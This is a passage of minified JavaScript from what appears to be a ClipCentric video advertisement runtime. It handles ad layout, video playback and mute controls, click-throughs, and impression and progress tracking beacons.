          var f = function (k) {
            dc = !0;
            Nc || c(k);
          };
        } else f = function (k) {
          dc = !0;
          c(k);
        };
        Q(a, e, f, d);
        de.push([a, b, c, d].concat(ob[ob.length - 1]));
      } else g = c;
      Q(a, b, g, d);
      de.push([a, b, c, d].concat(ob[ob.length - 1]));
    },
    $b = function (a, b, c, d) {
      try {
        rd ? d || (d = !1) : d = d && d.capture ? !0 : !1, a.removeEventListener(b, c, d);
      } catch (e) {}
    },
    Rf = function (a, b) {
      var c, d;
      if (c = xf[a]) for (d = 0; d < c.length; d++) if (void 0 === c[d][1] || c[d][1] === b) {
        var e = {
          type: a
        };
        void 0 !== b && (e.lid = b);
        try {
          c[d][0](e);
        } catch (g) {}
      }
    },
    Ce = function (a) {
      Nc = !1;
      ce = Mc(a);
      Q(a.target, "touchmove", Sf);
      Q(a.target, "touchend", re);
    },
    Sf = function (a) {
      var b = Mc(a);
      10 < Math.abs(ce.x - b.x) + Math.abs(ce.y - b.y) && (Nc = !0, re(a));
    },
    re = function (a) {
      $b(a.target, "touchmove", Sf);
      $b(a.target, "touchend", re);
    },
    Pg = function (a, b) {
      var c, d;
      if (c = a && a.className) c = a && a.className ? 0 <= (" " + a.className + " ").replace(/[\t\r\n\f]/g, " ").indexOf(" " + b + " ") : !1;
      if (c) {
        c = a.className.split(/\s+/);
        for (d = 0; d < c.length; d++) b === c[d] && (c.splice(d, 1), d--);
        a.className = c.join(" ");
      }
    },
    bb = function (a) {
      return Vb(a) ? a : gf + a;
    },
    Rg = function (a) {
      var b;
      if ((b = D[a]) && !hd[a]) {
        b = b[1];
        var c = B[a];
        var d = function (g, f) {
          return function (k) {
            f[73] = Ea();
            fd.push([Ea(), g]);
          };
        }(a, c);
        c = function (g, f) {
          return function (k) {
            f[74] = Ea();
            gd.push([Ea(), g]);
          };
        }(a, c);
        var e = function (g) {
          return function (f) {
            var k;
            if (k = (k = D[g]) && k[0]) try {
              var h = /(mousedown|touchstart)/.test(f.type) ? Wd[g] : hd[g];
              var m = B[g];
              if (!m[15] || 200 < f.timeStamp - m[16]) m[15] = k.getBoundingClientRect(), m[16] = f.timeStamp;
              var l = m[15];
              var n = Mc(f);
              var q = n.x - l.left;
              var r = n.y - l.top;
              var t = m[11];
              var p = m[12];
              t && 1 !== t && (q = Math.round(q / t));
              p && 1 !== p && (r = Math.round(r / p));
              h.push(q, r);
            } catch (y) {}
          };
        }(a);
        Aa(b, "mouseover", d, {
          passive: !0
        });
        Aa(b, "mouseout", c, {
          passive: !0
        });
        Aa(b, "mousemove", e, {
          passive: !0
        });
        Aa(b, "mousedown", e, {
          passive: !0
        });
        hd[a] = [];
        Wd[a] = [];
      }
    },
    Yb = function (a) {
      a = a ? 0 : Ea() - Nb;
      a = "/Z=1/I=" + mc + "/U=" + Ta + "/T=" + a + "/M=" + ef + "/D=" + kb;
      F && (F.publisherOverride && (a += "/PO=" + encodeURIComponent(F.publisherOverride)), F.placementOverride && (a += "/LO=" + encodeURIComponent(F.placementOverride)), F.verticalOverride && (a += "/VO=" + encodeURIComponent(F.verticalOverride)));
      return a;
    },
    oa = function (a, b, c) {
      var d = [];
      var e,
        g,
        f = Ea() - Nb;
      var k = new Image();
      if (/^(si|hm|hc)/.test(a)) var h = !0;else {
        var m = a.split(",");
        for (a = 0; a < m.length; a++) {
          var l = m[a];
          "im" === l ? za.hasOwnProperty(l) || (e = !0) : 0 === l.indexOf("cl") ? g = !0 : "ii" !== l && "hi" === l && (h = !0);
          za.hasOwnProperty(l) ? za[l]++ : za[l] = 0;
          if (mf.test(l) && 0 === za[l]) d.push(l);else if (xg.test(l)) d.push(l + "." + za[l]);else {
            if (0 === l.indexOf("le")) {
              var n = l.substr(2);
              var q = "ls" + n;
              n = "ld" + n;
              q = f - (Pd[q] || 0);
              jb[n] ? (q += jb[n], za[n]++) : za[n] = 0;
              jb[n] = q;
            } else 0 === l.indexOf("ls") && d.push(l + "." + za[l]);
            l in jb || (jb[l] = f);
            Pd[l] = f;
          }
        }
        if (0 >= d.length) return;
        a = d.join(",");
      }
      d = "https://tr.clipcentric.com/" + (g ? "d/" : "s/") + bd + Yb() + "/E=" + a;
      if (g) {
        a = "vpaid" === c;
        "$adtag_url" === b || "url" === b ? b = qc ? qc : "https://www.mesfire.com/request-service" : "$default_url" === b ? b = "https://www.mesfire.com/request-service" : "$vast_url" === b && (b = void 0);
        b = Wb(b);
        if (M && G.open) h = G.open;else {
          h = u.open;
          var r = !0;
        }
        e = /doubleclick.*\?.*&adurl=$/.test(Qa) || /bs\.serving\-sys\.com.*\?.*&rtu=$/.test(Qa) || /adsrvr\.org.*\?/.test(Qa) || /(\?|&|;)\w+=$/.test(Qa) ? Qa + encodeURIComponent(b) : Qa + b;
        g = d + "/NR=1/*" + e;
        /^http/i.test(b) && !a ? (k = /tr(\.|%2e)clipcentric(\.|%2e)com/i.test(b)) ? d = b : oc ? (navigator.sendBeacon(g, ""), d = e) : d = d + "/*" + e : (oc ? navigator.sendBeacon(g, "") : k.src = g, Qa && (oc ? navigator.sendBeacon(e, "") : (k = new Image(), k.src = e)), d = b);
        a || (/^mailto/i.test(b) && (c = "_top"), k = h(d, c || "_blank"), !k && r && h(d, "_top"));
      } else {
        if (e) {
          if (dd) for (a = 0; a < dd.length; a++) r = new Image(), r.src = Wb(dd[a]);
          if (rc && rc.length) if (a = Ha || Ba || Ca) {
            b = a.nextSibling;
            a.insertAdjacentHTML("afterend", Wb(rc.join("")));
            r = [];
            for (c = a.nextSibling; c && c !== b;) {
              if ("SCRIPT" === c.tagName) r.push(c);else for (e = c.querySelectorAll("script"), a = 0; a < e.length; a++) r.push(e[a]);
              c = c.nextSibling;
            }
            for (a = 0; a < r.length; a++) if ((e = r[a]) && "SCRIPT" === e.tagName) {
              c = C.createElement("script");
              c.text = e.innerHTML;
              for (b = 0; b < e.attributes.length; b++) c.setAttribute(e.attributes[b].name, e.attributes[b].value);
              e.parentNode.replaceChild(c, e);
            }
          } else lf = a = C.createElement("iframe"), a.scrolling = "no", a.style.cssText = "position:fixed;left:0px;top:0px;width:100%;height:100px;z-index:-1;pointer-events:none;opacity:0.0001;border-width:0px", a.srcdoc = '<!DOCTYPE html><html><style>html,body{width:100%;height:100%;margin:0;padding:0}</style><body><img style="width:100%;height:100%" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==">' + Wb(rc.join("")) + "</body></html>", P(la, a);
        }
        h && oc ? navigator.sendBeacon(d, "") : k.src = d;
      }
    },
    ee = function () {
      var a;
      if (top !== self) if (Y[1] || X || self.dicnf || self.inDapIF || self.inGptIF || self.isSIMID) Ja = self;else {
        var b = self.innerWidth;
        var c = self.innerHeight;
        var d = [120, 125, 160, 180, 200, 234, 250, 336, 468, 728, 970];
        320 >= b && 320 >= c ? a = !0 : 0 <= d.indexOf(b) ? a = !0 : 0 < c && 4 <= b / c && (a = !0);
        a && (Ja = self);
      }
    },
    qb = function () {
      var a = R,
        b = Z;
      var c = u;
      var d = la;
      var e = Va;
      var g = Qd;
      var f = top !== c;
      if (X) try {
        var k = Fc();
        R = k.win.w;
        Z = k.win.h;
      } catch (n) {} else if (M) {
        try {
          if ("ad_iframe" === self.frameElement.id) {
            R = self.innerWidth;
            Z = self.innerHeight;
            var h = !0;
          }
        } catch (n) {}
        if (!h) try {
          if (G && G.getMaxSize) {
            k = Qf();
            R = k.width;
            Z = k.height;
            var m = G.getExpandProperties();
            m.width > R && (R = m.width);
            m.height > Z && (Z = m.height);
          } else R = screen.width, Z = screen.height;
        } catch (n) {}
      } else f ? (R = c.innerWidth, Z = c.innerHeight) : (k = g ? d : e, R = k.clientWidth, Z = k.clientHeight);
      try {
        var l = top.visualViewport.scale;
      } catch (n) {}
      1 === I || f ? (Ab = l || 1, cd = Z) : (Ab = l ? l : R > Z ? Math.max(screen.width, screen.height) / R : Math.min(screen.width, screen.height) / R, 0 >= Ab && (Ab = 1), pb || (pb = ta(), f = pb.style, f.position = "absolute", f.top = "0px", f.left = "-130vw", f.width = "100vw", f.height = "100vh", f.zIndex = -1, P(d, pb)), cd = Math.max(Z, c.innerHeight, pb.offsetHeight));
      return a !== R || b !== Z;
    },
    Ec = function () {
      var a, b, c;
      if (Ja) {
        try {
          self.parent.alert && (a = !0);
        } catch (p) {}
        if (!a) {
          Ya = Ja.innerWidth;
          Za = Ja.innerHeight;
          if (X && Sb && !uf) {
            var d = Fc();
            Ya += d.exp.l + d.exp.r;
            Za += d.exp.t + d.exp.b;
          }
          return;
        }
      } else if (M) {
        d = se();
        0 < d.width ? Ya = d.width : Ya || (Ya = 320);
        0 < d.height ? Za = d.height : Za || (Za = 50);
        return;
      }
      a = Ja ? Ja.frameElement.parentElement : Ha ? Ha.parentNode : Ca.parentNode;
      var e = c = 5;
      try {
        var g = u.getComputedStyle(a);
        var f = g.lineHeight;
        var k = parseFloat(g.fontSize);
        var h = b = 0;
        h = "normal" === f ? 1.2 * k : /px/.test(f) ? parseFloat(f) : /%/.test(f) ? parseFloat(f) * k / 100 : parseFloat(f) * k;
        isNaN(h) || (e = Math.ceil(Math.max(e, h)) + 5);
        h = Math.ceil(parseFloat(g.paddingTop) + parseFloat(g.paddingBottom));
        isNaN(h) || (e += h);
        b = Math.ceil(parseFloat(g.paddingLeft) + parseFloat(g.paddingRight));
        isNaN(b) || (c += b);
      } catch (p) {}
      if (Ha) if (d = Ha.style, 0 < (I & 390) && 11 > fb) {
        var m = !0;
        var l = d.width;
        var n = d.height;
        var q = d.padding;
        d.width = d.height = d.padding = "0px";
      } else {
        var r = d.position;
        d.position = "absolute";
      }
      for (h = b = 0; a;) try {
        g = u.getComputedStyle(a);
        h < c && /\d+px$/.test(g.width) && (h = parseInt(g.width));
        b < e && /\d+px$/.test(g.height) && (b = parseInt(g.height));
        if ("none" === g.display) {
          ma(ke, 50, 0, 0);
          var t = !0;
          break;
        }
        if (h < c || b < e) a = a.parentElement;else break;
      } catch (p) {
        break;
      }
      d && (m ? (d.width = l, d.height = n, d.padding = q) : d.position = r);
      if (0 >= h || t) Ja && Ja.innerWidth ? (h = Ja.innerWidth, b = Ja.innerHeight) : (a = Ba.parentElement, g = u.getComputedStyle(a), /\d+px$/.test(g.width) && /\d+px$/.test(g.height) || (g = a.getBoundingClientRect()), h = Math.max(parseInt(g.width), 120), b = Math.max(parseInt(g.height), 50));
      Ya = h;
      Za = b;
    },
    Kf = function () {
      var a;
      for (a = 0; 5 >= a; a++) ea[a][0] && wa[a] && (a === qa ? zd() : Oa(a, !0));
    },
    Xb = function (a) {
      !Ac && nb && (Ac = !0, qb(), Xd === R && Yd === Z && a && "resize" === a.type || (Ec(), Kf()), Xd = R, Yd = Z, sa(jd), jd = ma(Lf, 1));
    },
    Lf = function () {
      Ac = !1;
    },
    ke = function (a, b) {
      qb();
      a !== R && Xb();
      12 > b && (sa(qf), qf = ma(ke, 100, R, b + 1));
    },
    xa = function (a, b) {
      if ("number" === typeof a) {
        a = (a = D[a]) && a[0];
        if (!a) return;
        a = a.style;
      } else if (a) a = a.style;else return;
      a.display = b ? "block" : "none";
    },
    ta = function (a) {
      a = C.createElement(a || "div");
      var b = a.style;
      a.draggable = !1;
      a.ondragstart = function () {
        return !1;
      };
      b.display = "block";
      b.padding = "0px";
      b.margin = "0px";
      b.borderWidth = "0px";
      b.minWidth = "0px";
      b.minHeight = "0px";
      b.maxWidth = "none";
      b.maxHeight = "none";
      b.WebkitTapHighlightColor = "rgba(0,0,0,0)";
      b.WebkitUserSelect = "none";
      b.MozUserSelect = "none";
      b.MsUserSelect = "none";
      b.userSelect = "none";
      b.boxSizing = "content-box";
      return a;
    },
    Gf = function (a) {
      var b;
      if (wa[a]) {
        var c = B[a];
        if (!c[0]) {
          c[0] = !0;
          c[58] = a;
          var d = ab(a);
          var e = ea[a];
          var g = wa[a];
          var f = wa[a];
          var k = g[17];
          var h = f[3];
          var m = f[4];
          var l = bb(f[9]);
          f = D[a] = [];
          f[0] = b = ta();
          var n = b.style;
          n.width = h + "px";
          n.height = m + "px";
          f[1] = h = b.cloneNode(!1);
          var q = h.style;
          q.position = "absolute";
          q.left = q.top = "0px";
          P(b, h);
          var r = null !== g[12] ? g[12] : g[10];
          var t = 0 === r ? 0 : 1;
          (m = 0 === a) ? (nd[a] = !0, n.position = "relative", n.display = "inline-block", n.cursor = "pointer", n.zIndex = 900, q.zIndex = 100, q.overflow = "hidden", Y[1] || (c = ta(), c.style.visibility = "hidden", c.style.zIndex = -1, c.innerHTML = "&nbsp;", P(b, c)), e[0] = !0) : (n.position = "absolute", n.zIndex = 100 + k, n.overflow = "hidden", xa(a, !1), "number" === typeof r ? D[r] && (P(D[r][t], b), c[57] = r) : /(view|page)/.test(r) && (n.zIndex = 900 + k, "page" !== r && (n.position = vf ? "absolute" : "fixed"), P(la, b, la.firstChild), c[57] = r));
          if (m) {
            var p = g[22];
            var y = yb[0];
            lb || (y += "%20Alt", g[21] && (l = bb(g[21]), d = "image", g[23] && (p = g[23])));
            p = (e = je(p)) ? e : "$adtag_url" === p || "url" === p ? qc ? qc : "https://www.mesfire.com/request-service" : "$default_url" === p ? "https://www.mesfire.com/request-service" : "";
          }
          "image" === d && (e = ta("img"), m && (e.src = l), e.draggable = !1, l = e.style, l.width = l.height = "100%", l.left = l.top = "0px", l.position = "absolute", 0 < (I & 390) && yd(e, "translateZ(0)"), P(h, e), f[2] = e, m && p && (e.onclick = function () {
            oa("cl:" + y + ",ii", p);
          }));
          "video" === d && Sg(a);
          "canvas" === d && (lg(a), m && ma(ie, 0, a));
          "frame" === d && Tg(a);
          lb && Ug(a);
          m && Oa(a, !0);
          Rg(a);
          return b;
        }
      }
    },
    Ug = function (a) {
      var b;
      var c = D[a];
      var d = B[a];
      var e = ff[a];
      d[59] && (d[59][0].style.display = "none");
      if (ed[a]) ed[a][0].style.display = "block", d[59] = ed[a];else if (e && c) {
        d = d[59] = ed[a] = [];
        c = c[1];
        var g = ta();
        var f = g.style;
        f.position = "absolute";
        f.top = f.left = "0px";
        f.width = f.height = "100%";
        f.pointerEvents = "none";
        d.push(g);
        for (b = 0; b < e.length; b++) {
          var k = ta();
          f = k.style;
          f.backgroundColor = e[b][4];
          f.position = "absolute";
          f.pointerEvents = "auto";
          f.cursor = "pointer";
          f.opacity = "0.001";
          d.push(k);
          P(g, k);
          1 === a && 0 === b && Aa(k, "click", function (h) {
            0 === (I & 1) && h.preventDefault && h.preventDefault();
            oa("cl:video,ii", "$default_url");
          });
          2 === a && 0 === b && (Aa(k, "click", function (h) {
            0 === (I & 1) && h.preventDefault && h.preventDefault();
            cb(3, 1, !0);
          }), Aa(k, "click", function (h) {
            0 === (I & 1) && h.preventDefault && h.preventDefault();
            Fa(ba[1], "muteoff", null, !0);
          }));
          3 === a && 0 === b && (Aa(k, "click", function (h) {
            0 === (I & 1) && h.preventDefault && h.preventDefault();
            cb(2, 1, !0);
          }), Aa(k, "click", function (h) {
            0 === (I & 1) && h.preventDefault && h.preventDefault();
            Fa(ba[1], "muteon", null, !0);
          }));
          4 === a && (0 === b && Aa(k, "click", function (h) {
            0 === (I & 1) && h.preventDefault && h.preventDefault();
            oa("cl:replay,ii", "https://www.mesfire.com/request-service");
          }), 1 === b && (Aa(k, "click", function (h) {
            0 === (I & 1) && h.preventDefault && h.preventDefault();
            cb(1, 1, !0);
            cb(3, 1, !0);
          }), Aa(k, "click", function (h) {
            0 === (I & 1) && h.preventDefault && h.preventDefault();
            Fa(ba[1], "muteoff", null, !0);
          })));
        }
        P(c, g);
      }
    },
    Ad = bb("clipcentric-a.akamaihd.net"),
    aa = [],
    xd = [],
    Mf = [],
    Gc = [],
    Tf = [],
    ja = [],
    Uf = {},
    eb;
  aa[1] = {
    pW: 3,
    dur: 27.03,
    muted: 1,
    ccogvUrl: "/video/F=1687071/V=ad_576x324_w2450/T=1696276964/S=xb6sYkYW/",
    bg: "#000000",
    poster: "/file/1687071/ad_640x360_p0/1696276964/-uv0gJVE?f=auto",
    oh: 360,
    pC: "rgba(229, 60, 46, 1)",
    progress: 1,
    ow: 640
  };
  xd[1] = "B=193/F=1687071/R=1723574/C=1128351/P=22/S=-robXFVI";
  var Vf = function (a) {
      if (!eb) {
        eb = {};
        var b = C.createElement("video");
        b.canPlayType("video/mp4") && (eb.mp4 = !0, 1 === I || b.canPlayType('video/mp4; codecs="avc1.64001E"')) && (eb.high = !0);
        b.canPlayType("video/webm") && (eb.webm = !0);
        b.canPlayType('video/mp4; codecs="hvc1"') && (eb.hevc = !0);
      }
      return a && eb.hevc ? "hevc.mp4" : a && eb.webm || Rd ? "webm" : eb.high ? "high.mp4" : "mp4";
    },
    ac = function (a, b) {
      Ea();
      if (yg.test(b)) {
        var c = aa[a] || {};
        if (c.isVpaid) var d = c.vpaidUrl || "";else c.isVastplayer ? (d = D[a][3], d = d.src) : (d = bb(wa[a][9]), c.remote || (d += "." + Vf(c.alpha)));
        c = b + ":" + yb[a];
        0 === b.indexOf("vimp") && (le(2, a), Uf[d] || (c += ",vdownload:" + yb[a], Uf[d] = !0));
        d = "https://tr.clipcentric.com/s/" + xd[a] + Yb() + "/E=" + c + "/!" + d;
        a = b + ":" + a;
        za.hasOwnProperty(a) ? za[a]++ : za[a] = 0;
        0 === za[a] && (a = new Image(), a.src = d);
      }
    },
    Wf = function (a, b) {
      var c, d, e;
      var g = D[a][3];
      if (void 0 === b && !g.seeking) {
        try {
          b = g.currentTime / (g.ccDuration || g.duration);
        } catch (m) {}
        b || (b = 0);
      }
      b = Math.floor(20 * b);
      g = B[a];
      if (b > g[24]) {
        for (c = !g[25] || 2 >= b - g[24] ? g[24] + 1 : b; c <= b; c++) {
          if (0 === c % 2) var f = c >> 1;else if (5 === c || 15 === c) f = (c >> 1) + "p5";else continue;
          ac(g[58], "vprogress_" + f);
          f = a;
          f = aa[f];
          if (f.track || f.vast) {
            var k = "progress_" + 5 * c;
            if (d = f.track && f.track[k]) for (e = 0; e < d.length; e++) if (Vb(d[e])) {
              var h = new Image();
              h.src = Wb(d[e]);
            }
            f.vast && !g[60] && (f.notrack || (f.notrack = {}), f.notrack[k] = !0);
          }
        }
        g[24] = b;
      }
      g[25] = !1;
    },
    Hg = function () {
      var a,
        b = [1],
        c = [];
      if (!zb) {
        var d = b.length;
        for (a = 0; a < d; a++) {
          var e = b[a];
          if (zb) {
            if (!aa[e].as && !aa[e].at) continue;
          } else if (0 === (I & 384) && !aa[e].auto) continue;
          c.push(e);
          var g = B[e];
          var f = g[2];
          g[2] = f ? f + 1 : 1;
          aa[e].auto && (g[23] = 1, (f = D[e][4]) && f.ccLayoutControl(2, 1, 0));
        }
        if (0 !== c.length) if (a = C.createElement("SCRIPT"), a.type = "text/javascript", a.onload = function () {
          var k;
          var h = c.length;
          for (k = 0; k < h; k++) {
            var m = c[k];
            var l = aa[m].as || aa[m].at;
            var n = Ad + aa[m].ccogvUrl + "video";
            var q = n + (l ? ".abs.ogv" : ".ogv");
            n = l ? "" : n + ".m4a";
            var r = D[m][3];
            r.duration = aa[m].dur;
            u.CCOGV(q, n, r, {
              loadAll: l
            });
            q = B[m];
            q[2]--;
            0 === q[2] && fc(m);
          }
        }, u.CCOGV) a.onload();else a.src = nc + "ccogv.min.js?q=o33", P(C.getElementsByTagName("head")[0], a);
      }
    },
    Ig = function () {
      var a,
        b = [1],
        c = [];
      if (0 < (I & 6) && !zb) {
        var d = b.length;
        for (a = 0; a < d; a++) {
          var e = b[a];
          c.push(e);
          var g = B[e];
          e = g[2];
          g[2] = e ? e + 1 : 1;
        }
        if (0 !== c.length) if (a = C.createElement("SCRIPT"), a.type = "text/javascript", a.onload = function () {
          var f;
          var k = c.length;
          for (f = 0; f < k; f++) {
            var h = c[f];
            var m = Ad + aa[h].ccogvUrl + "video.m4a";
            var l = D[h][3];
            u.CCIPA(m, l);
            m = B[h];
            m[2]--;
            0 === m[2] && fc(h);
          }
        }, u.CCIPA) a.onload();else a.src = nc + "ccipa.min.js?q=n33", P(C.getElementsByTagName("head")[0], a);
      }
    },
    Sg = function (a) {
      var b = D[a],
        c = b[1],
        d;
      var e = aa[a];
      var g = B[a];
      g[58] = a;
      g[23] = e.muted ? 1 : 2;
      g[27] = .8;
      var f = Vf(e.alpha);
      if (e.progress) {
        g = ta();
        var k = g.style;
        k.position = "absolute";
        k.left = k.bottom = "0px";
        k.height = e.pW + "px";
        k.width = "0%";
        k.backgroundColor = e.pC;
        k.pointerEvents = "none";
        k.zIndex = 2E3;
        yd(g, "translateZ(0)");
        b[10] = g;
        P(c, g);
      }
      g = ta();
      P(c, g);
      e.alpha || (g.style.backgroundColor = e.bg);
      if (!zb) {
        var h = 0 !== (I & 384) || e.auto ? !0 : !1;
        0 < (I & 6) && 1 === a && (d = !0);
      }
      h ? (e = ta("canvas"), P(g, e), b[2] = b[3] = e) : (c = bb(wa[a][9]), e.remote || (c += "." + f), d && (c = c.replace(/[^\/]*$/, "an.mp4")), b[2] = b[3] = b = ta("video"), b.style.objectFit = "cover", b.preload = "none", h = 85 <= Sd, e.poster && !h ? b.poster = Ad + e.poster : 0 < (I & 1560) && (b.poster = "data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="), b.muted = !!e.muted, b.playsInline = !0, b.src = c, e.vtt && (d = C.createElement("track"), d.default = !0, b.crossOrigin = "anonymous", P(b, d), c = bb(e.vtt), Jb ? Q(b, "loadedmetadata", function (m, l) {
        return function () {
          m.src = l;
        };
      }(d, c)) : d.src = c), h && e.poster && (d = ta("img"), c = d.style, d.id = "ccp", d.src = Ad + e.poster, c.width = c.height = "100%", c.left = c.top = "0px", c.position = "absolute", c.objectFit = "cover", P(g, d)), P(g, b));
      Vg(a);
    },
    Vg = function (a) {
      var b = D[a],
        c = b[1],
        d = b[3];
      Q(d, "loadedmetadata", function (e) {
        e = d.duration;
        d.ccDuration = isFinite(e) && 1 !== e ? e : aa[a].dur;
      });
      Q(d, "play", function (e) {
        e = B[a];
        6 !== e[22] && (e[26] || (e[26] = setInterval(Wf, 100, a)), e = 0 <= zc ? zc : e[27], d.volume = bc(e), ac(B[a][58], "vimpression"), oa("vi"), Gb(a, !1), Xf(a, !1));
      });
      Q(d, "waiting", function (e) {
        Gb(a, !0);
      });
      Q(d, "canplay", function (e) {
        Gb(a, !1);
      });
      Q(d, "playing", function (e) {
        Gb(a, !1);
      });
      Q(d, "ended", function (e) {
        Yf(a);
      });
      Aa(c, "mouseup", function (e) {
        B[a][34] || Fa(a, "play", null, !0);
      });
      1 === a && (Q(d, "pause", function (e) {
        e = B[a];
        4 !== e[22] && (xa(b[5], !0), xa(b[6], !1), C.activeElement === b[6] && b[5].focus());
        clearInterval(e[32]);
      }), Q(d, "play", function (e) {
        e = B[a];
        4 !== e[22] && (xa(b[5], !1), xa(b[6], !0), C.activeElement === b[5] && b[6].focus());
        clearInterval(e[32]);
        e[32] = setInterval(function () {
          te(a, "setPlayhead", d.currentTime / (d.ccDuration || d.duration));
        }, 10);
      }));
    },
    Yf = function (a, b) {
      var c = B[a],
        d = aa[a],
        e = D[a][3];
      clearInterval(c[26]);
      c[26] = null;
      te(a, "status", b ? 9 : 3, c[23]);
      d.rewind && (e.load(), e.poster = e.poster, te(a, "setPlayhead", 0));
    },
    ue,
    Wg = function (a) {
      var b,
        c,
        d,
        e = [],
        g = [1];
      if (1 !== I && !ue) {
        for (b = 0; 1 > b; b++) {
          var f = g[b];
          if (!e[f] && f !== a && (c = D[f]) && (c = c[2]) && "VIDEO" === c.tagName) {
            var k = B[f];
            1 === k[22] && !c.paused || k[34] || (k[22] = 6, c.muted = !0, (d = cc(c, f)) ? d.then(function (h, m) {
              return function () {
                6 === m[22] && (m[22] = 2, h.pause(), 2 === m[23] && (h.muted = !1, h.volume = bc(m[27])));
              };
            }(c, k)) : c.pause(), e[f] = !0);
          }
        }
        ue = !0;
      }
    },
    Zf = function (a) {
      var b = ta();
      var c = b.style;
      c.position = "absolute";
      c.top = c.left = "0px";
      c.width = c.height = "100%";
      c.zIndex = 10;
      c.backgroundImage = "url(" + a + ")";
      c.backgroundRepeat = "no-repeat";
      c.backgroundPosition = "center center";
      c.backgroundSize = "contain";
      return b;
    },
    Gb = function (a, b) {
      var c = B[a],
        d = nc + "loader_p50.svgz?q=33";
      var e = aa[a];
      e.as || e.at || e.noloader || (b ? c[28] || (c[28] = ma(function (g) {
        var f = D[g],
          k = f[1];
        B[g][28] = null;
        f[9] || (f[9] = Zf(d), P(k, f[9], k.firstChild));
      }, 500, a)) : (a = D[a], sa(c[28]), c[28] = null, db(a[9]), a[9] = null));
    },
    Xf = function (a, b) {
      var c = nc + "play_p50.svgz?q=33";
      a = D[a];
      b ? a[11] || (a[11] = Zf(c), b = a[11].style, b.opacity = .7, b.pointerEvent = "none", b = a[1], P(b, a[11], b.firstChild)) : a[11] && (db(a[11]), a[11] = null);
    },
    bc = function (a) {
      a = (Math.pow(10, a) - 1) / 9;
      isNaN(a) && (a = .8);
      0 > a && (a = 0);
      1 < a && (a = 1);
      return a;
    },
    Xg = function (a) {
      if (32 === a.keyCode || 13 === a.keyCode) a.preventDefault(), a.stopImmediatePropagation(), a.currentTarget.click();
    },
    cc = function (a, b, c) {
      if (tf && !kd) Gc.push([a, b]);else {
        var d = a.play();
        try {
          var e = new Promise(function (g, f) {
            d.then(function (k) {
              g(k);
              B[b][34] = !0;
            }).catch(function (k) {
              var h,
                m = ["pause", "notallowed"];
              var l = B[b];
              if ("NotAllowedError" === k.name) if (a.muted || c) {
                l[22] = 9;
                Gb(b, !1);
                aa[b].as || aa[b].at || Xf(b, !0);
                try {
                  for (h = 0; 2 > h; h++) {
                    var n = C.createEvent("Event");
                    n.initEvent(m[h], !1, !1);
                    a.dispatchEvent(n);
                  }
                } catch (r) {}
              } else {
                a.muted = !0;
                l[23] = 1;
                n = D[b];
                (n = n[4]) && n.ccLayoutControl(l[22], l[23], l[27]);
                l = cc(a, b, !0);
                l.then(function (r) {
                  g(r);
                  B[b][34] = !0;
                }).catch(function (r) {
                  f(r);
                });
                var q = !0;
              }
              if (!q) {
                Yf(b, !0);
                try {
                  f(k);
                } catch (r) {}
              }
            });
          });
          e.catch(function () {});
          return e;
        } catch (g) {
          B[b][34] || Q(a, "playing", function (f) {
            B[b][34] = !0;
          });
        }
      }
    },
    Fa = function (a, b, c, d) {
      var e,
        g = b,
        f = B[a],
        k = f[58],
        h = ea[k],
        m = D[a],
        l = m && m[3],
        n = m && m[4],
        q = "IFRAME" === (l && l.tagName);
      Lc && (d = !0);
      if (4 === a) d && oa("ii");else if (l) {
        try {
          "toggle" === b ? g = 1 !== f[22] ? "play" : "pause" : "mutetoggle" === b && (g = 1 === f[23] ? "muteoff" : "muteon");
          if ("open" === b) {
            if (!h[0] || !m[0] || !m[0].parentNode) return;
            1 < Tb && (f[23] = Tb);
            0 <= zc && (f[27] = zc);
            1 === I || !zb || d && !oe || ue || M || (f[23] = 1);
            g = b = "play";
            var r = 1 === f[23];
            var t = f[27];
            l.muted = r;
            l.volume = r ? 0 : bc(t);
            f[34] || Gb(a, !0);
            Ob && (g = b = "", Gb(a, !1));
            Ob && (f[22] = 8);
          } else if ("close" === b) f[22] = 2, clearInterval(f[26]), clearInterval(f[32]), sa(f[31]), f[26] = null, f[32] = null, n && n.ccSetPlayhead(0);else {
            if ("status" === b) {
              var p = {
                notallowed: 9 === f[22],
                paused: 2 === f[22],
                ended: 3 === f[22],
                muted: 1 === f[23]
              };
              q || (p.paused = l.paused, p.ended = l.ended, p.muted = l.muted);
              return p;
            }
            if ("getPlayhead" === b) return p = q ? Yg(a, b) : void 0 !== l.currentTime ? Math.min(Math.max(l.currentTime / (l.ccDuration || l.duration || aa[a].dur), 0), 1) : 0;
            d && oa("ii");
            try {
              if ("play" !== b && "toggle" !== b || h[0]) "rewind" === b ? (l.currentTime = 0, n && n.ccSetPlayhead(0)) : "setVolume" === b ? (zc = f[27] = c, 1 === f[23] && 0 < c ? (Tb = f[23] = 2, ac(k, "vmuteoff")) : 2 === f[23] && 0 === c && (Tb = f[23] = 1, ac(k, "vmuteon"))) : "muteon" === b ? Tb = f[23] = 1 : "muteoff" === b ? Tb = f[23] = 2 : "fullscreenon" === b ? ve(a, !0) : "fullscreenoff" === b && ve(a, !1);else {
                ac(k, "v" + g);
                cb(k, 1, d);
                return;
              }
            } catch (y) {}
            ac(k, "v" + g);
          }
          "play" === g ? (6 !== f[22] && (e = cc(l, a)), f[22] = 1, sa(f[31])) : "pause" === g ? (6 !== f[22] && l.pause(), f[22] = 2, sa(f[31])) : 0 === b.indexOf("mute") ? (r = "muteon" === g, 6 !== f[22] && (l.muted = r, l.volume = r ? 0 : bc(f[27])), f[23] = r ? 1 : 2) : "setVolume" === b ? (l.volume = bc(c), 0 < c && 6 !== f[22] && (l.muted = !1)) : "close" === b && (l.ccogv ? l.stop() : 0 !== (I & 390) && l.ended || ma(function (y) {
            return function () {
              try {
                var w = D[y][3];
                ea[B[y][58]][0] || (w.pause(), w.currentTime = 0);
              } catch (v) {}
            };
          }(a), 100), sa(f[31]));
          "setVolume" === g ? n && n.ccSetVolume(c) : "seekStart" === g ? (1 === f[22] && (f[22] = 4), l.pause && l.pause()) : "seekEnd" === g ? 4 === f[22] && (f[22] = 1, e = cc(l, a)) : "setPlayhead" === g && (void 0 !== l.currentTime && (l.currentTime = c * (l.ccDuration || l.duration || aa[a].dur)), n && n.ccSetPlayhead(c));
          n && n.ccLayoutControl(f[22], f[23], f[27]);
        } catch (y) {}
        return e;
      }
    },
    Yg = function (a, b, c) {
      var d = (d = D[a]) && d[3];
      if ("getPlayhead" === b) {
